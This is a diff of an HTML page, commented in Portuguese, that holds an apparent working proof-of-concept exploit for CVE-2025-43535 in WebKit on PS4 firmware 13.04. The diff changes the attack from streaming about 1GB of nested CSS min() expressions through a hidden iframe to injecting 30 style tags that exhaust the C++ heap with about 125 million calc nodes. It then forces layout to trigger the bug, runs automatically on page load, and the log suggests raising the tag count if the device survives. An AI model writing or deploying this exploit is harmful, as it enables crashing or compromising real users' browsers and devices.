@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — Iframe Stream</title>
+<title>CVE-2025-43535 — Chunked Heap Exhaustion</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
@@ -11,10 +11,9 @@
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · PS4 FW 13.04 (GitHub Native)</div>
+<div>CVE-2025-43535 · Fragmentação de Heap · PS4 FW 13.04</div>
 <div id="log"></div>
-
-<iframe id="sandbox" style="position:absolute;top:-9999px;width:1px;height:1px;"></iframe>
+<div id="stage" style="visibility:hidden"></div>
 
 <script>
 "use strict";
@@ -25,7 +24,7 @@ const L = (m, c) => {
   d.scrollTop = d.scrollHeight;
 };
 
-// Constrói um bloco base (C22 = ~36MB). Isso é seguro para a RAM do JS.
+// Constrói a árvore de profundidade N (C22 = ~36MB / ~4.19M de nós)
 function buildDepth(depth) {
   let e = '1px';
   for (let d = 1; d <= depth; d++) {
@@ -34,93 +33,68 @@ function buildDepth(depth) {
   return e;
 }
 
-async function run() {
-  L('Iniciando Iframe Streaming...', 'warn');
+// Respiro para não travar a UI durante o loop
+const yieldGC = () => new Promise(r => setTimeout(r, 100));
 
-  // 1. Gera o bloco base
-  L('Construindo bloco C22 base no JS (~36MB)...', 'info');
+async function run() {
+  L('Iniciando Tática de Fragmentação (Style Chunking)...', 'warn');
+
+  // 1. Gera o bloco C22. Como você mapeou, o pico do JS ficará super baixo.
+  L('Construindo o bloco base C22 no JS...', 'info');
   let c22;
   try {
     c22 = buildDepth(22);
-    L(`Bloco C22 pronto. JS usando pouca RAM.`, 'ok');
+    L(`Bloco C22 gerado. Tamanho no JS: ~36MB.`, 'ok');
   } catch(e) {
     L('Erro ao gerar C22: ' + e, 'fail');
     return;
   }
 
-  L('Abrindo fluxo de escrita direta para o WebKit C++...', 'warn');
-  
-  // Pegamos o documento do iframe
-  const iframe = document.getElementById('sandbox');
-  const doc = iframe.contentDocument || iframe.contentWindow.document;
-  
-  doc.open();
-  
-  // Atalho para não escrever doc.write toda hora
-  const w = (str) => doc.write(str);
+  // 30 tags * 4.19M nós = 125.7M de nós (Acima dos 119.5M do seu limite)
+  const totalTags = 30;
 
-  // Função para montar um C24 (144MB) juntando quatro C22 (36MB)
-  // Mas jogando direto no C++, sem salvar no JS!
-  function writeC24() {
-    w('min(min('); w(c22); w(','); w(c22); w('),min('); w(c22); w(','); w(c22); w('))');
-  }
+  L(`Injetando ${totalTags} tags <style> separadas...`, 'warn');
+  L(`Alvo: Acumular ~125 Milhões de objetos CSSCalcValue.`, 'info');
 
-  // 2. Injeta o CSS gigante (Exatos 1044MB do PoC Original)
-  L('Transmitindo os chunks de 36MB para formar 1GB de CSS...', 'info');
-  
-  try {
-    w('<style>.t{width:');
-    
-    // O Blob Original:
-    w('min(');
-      // Esquerda: 576MB / 67.1M nós
-      w('min(');
-        w('min('); writeC24(); w(','); writeC24(); w('),');
-        w('min('); writeC24(); w(','); writeC24(); w(')');
-      w('),');
+  for (let i = 1; i <= totalTags; i++) {
+    try {
+      const style = document.createElement('style');
+      // Cada tag cria uma classe diferente para o C++ não otimizar e agrupar
+      style.textContent = `.t${i} { width: ${c22} }`;
+      document.head.appendChild(style);
       
-      // Direita: 468MB / 54.5M nós
-      w('min(');
-        w('min('); writeC24(); w(','); writeC24(); w('),');
-        w('min('); writeC24(); w(','); w(c22); w(')'); // <--- O último é um C22!
-      w(')');
-    w(')}');
-    w('</style><div class="t" id="target"></div>');
+      L(`[${i}/${totalTags}] Tag <style> anexada (+36MB no Heap C++).`, 'ok');
+      
+      // Instancia a classe no DOM para forçar a engine a criar os nós matemáticos
+      const el = document.createElement('div');
+      el.className = `t${i}`;
+      document.getElementById('stage').appendChild(el);
 
-    L('Transmissão concluída. 1GB entregue ao HTML Parser.', 'ok');
-  } catch(e) {
-    L('Erro durante o streaming: ' + e, 'fail');
-    return;
+      // Pausa a cada 5 tags para permitir que o WebKit processe os nós
+      if (i % 5 === 0) await yieldGC();
+      
+    } catch(e) {
+      L(`Erro na injeção ${i}: ${e}`, 'fail');
+    }
   }
 
-  // 3. Limpa o C22 do JavaScript para dar RAM ao WebKit
-  L('Deletando chunk C22 do JS para liberar RAM...', 'warn');
-  c22 = null;
-  
-  // Um tempinho pro Garbage Collector do JS limpar o chunk
+  L('Todas as 30 tags foram injetadas!', 'warn');
+  L('Deletando string do JS para garantir máxima RAM livre pro kernel...', 'info');
+  c22 = null; 
+  await yieldGC();
+
+  L('Forçando recálculo global para ativar o gatilho final...', 'crash');
   setTimeout(() => {
-    L('Fechando documento para o CSS Parser engolir a árvore...', 'warn');
-    
-    // Isso engatilha o parser e constrói a árvore de milhões de nós
-    doc.close();
-
-    setTimeout(() => {
-      L('Forçando layout para engatilhar o CVE...', 'crash');
-      
-      // Força o C++ a calcular a matemática absurda
-      const target = doc.getElementById('target');
-      try {
-        void target.offsetWidth;
-        L('Sobreviveu. O console precisaria de mais nós.', 'fail');
-      } catch(e) {
-        L('Falha no layout: ' + e, 'fail');
-      }
-      
-    }, 150);
-  }, 300);
+    try {
+      void document.body.offsetWidth;
+      L('Sobreviveu. Tente aumentar o número totalTags para 32 ou 35.', 'fail');
+    } catch(e) {
+      L('Erro no layout: ' + e, 'fail');
+    }
+  }, 500);
 }
 
-window.addEventListener('load', () => setTimeout(run, 300));
+window.addEventListener('load', () => setTimeout(run, 500));
 </script>
 </body>
 </html>
